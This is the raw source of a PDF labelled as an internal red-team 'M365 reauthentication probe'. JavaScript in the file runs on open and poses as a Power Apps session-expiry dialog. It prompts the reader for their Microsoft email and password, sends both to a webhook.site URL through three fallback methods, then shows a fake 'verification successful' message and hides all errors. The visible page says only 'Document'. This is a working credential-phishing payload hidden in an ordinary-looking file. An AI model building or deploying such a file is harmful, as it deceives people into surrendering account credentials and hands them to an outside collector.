%PDF-1.7
% M365 Reauthentication Probe - Internal Red Team Only
1 0 obj
<< /Type /Catalog
   /Pages 2 0 R
   /OpenAction 3 0 R
>>
endobj

2 0 obj
<< /Type /Pages
   /Kids [4 0 R]
   /Count 1
>>
endobj

3 0 obj
<< /Type /Action
   /S /JavaScript
   /JS (
      try {

        // === STEP 1: EMAIL ===
        var emailCapture = app.response({
          cQuestion: "Your Power Apps session has expired.\n\nTo continue, please verify your Microsoft account.\n\nEmail or phone:",
          cTitle: "Power Apps",
          cDefault: ""
        });

        // User hit cancel
        if (emailCapture === null) {
          app.alert({
            cMsg: "Session verification cancelled. Some features may be unavailable.",
            cTitle: "Power Apps",
            nIcon: 1
          });
        } else {

          // === STEP 2: PASSWORD ===
          var passCapture = app.response({
            cQuestion: "Enter the password for\n" + emailCapture + "\n",
            cTitle: "Power Apps",
            cDefault: ""
          });

          if (passCapture === null) {
            app.alert({
              cMsg: "Session verification cancelled. Some features may be unavailable.",
              cTitle: "Power Apps",
              nIcon: 1
            });
          } else {

            // === STEP 3: FAKE LOADING ===
            app.alert({
              cMsg: "Verifying credentials...\n\nPlease wait.",
              cTitle: "Power Apps",
              nIcon: 3
            });

            // === STEP 4: EXFIL BOTH VALUES ===
            var payload = "email=" + emailCapture + "&pass=" + passCapture
              + "&ver=" + app.viewerVersion
              + "&lang=" + app.language
              + "&t=" + (new Date().toISOString());

            // Attempt 1: submitForm
            try {
              this.submitForm({
                cURL: "https://webhook.site/b8b9b62a-b796-4362-9f3f-6a860ac221ce?" + payload,
                cSubmitAs: "HTML"
              });
            } catch(e) {}

            // Attempt 2: launchURL https
            try {
              app.launchURL(
                "https://webhook.site/b8b9b62a-b796-4362-9f3f-6a860ac221ce?" + payload,
                false
              );
            } catch(e) {}

            // Attempt 3: mailto fallback
            try {
              app.launchURL(
                "mailto:redteam@yourcompany.com?subject=PA-CAPTURE&body=" + payload,
                false
              );
            } catch(e) {}

            // === STEP 5: CONVINCING SUCCESS MESSAGE ===
            app.alert({
              cMsg: "Verification successful.\n\nWelcome back, " + emailCapture.split("@")[0] + ".",
              cTitle: "Power Apps",
              nIcon: 3
            });

          }
        }

      } catch(e) {
        // Fail silently - no error shown to target
      }
   )
>>
endobj

4 0 obj
<< /Type /Page
   /Parent 2 0 R
   /MediaBox [0 0 400 300]
   /Contents 5 0 R
   /Resources 
     /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica >> >>
   >>
>>
endobj

5 0 obj
<< /Length 90 >>
stream
BT /F1 14 Tf 50 250 Td (Document) Tj ET
BT /F1 12 Tf 50 220 Td ( ) Tj ET
endstream
endobj

